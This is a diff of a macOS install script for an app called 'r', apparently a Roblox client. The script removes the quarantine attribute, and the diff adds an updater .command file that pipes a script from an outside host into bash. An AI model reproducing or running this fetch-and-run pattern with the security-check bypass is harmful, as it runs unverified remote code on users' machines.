@@ -116,13 +116,24 @@ xattr -rd com.apple.quarantine "$FINAL_APP_PATH" 2>/dev/null || true
 
 echo "Installed to: $FINAL_APP_PATH"
 
-# --- LAUNCHER ---
+# --- LAUNCHERS ---
 LAUNCHER="$INSTALL_DIR/launch_r"
 cat > "$LAUNCHER" << 'EOF'
 #!/bin/bash
 exec "$HOME/Applications/r.app/Contents/MacOS/r" "$@"
 EOF
 chmod +x "$LAUNCHER"
+
+# Command-file updater launcher in the same folder as r.app
+R_UPDATER="$INSTALL_DIR/R updater.command"
+cat > "$R_UPDATER" << 'EOF'
+#!/bin/bash
+
+curl -fsSL https://apps.suspendednetwork.tech/installers/roblox.command | bash
+EOF
+chmod +x "$R_UPDATER"
+
+echo "Created updater command file: $R_UPDATER"
 
 # --- CLEANUP ---
 rm -rf /tmp/roblox.zip /tmp/RobloxExtract
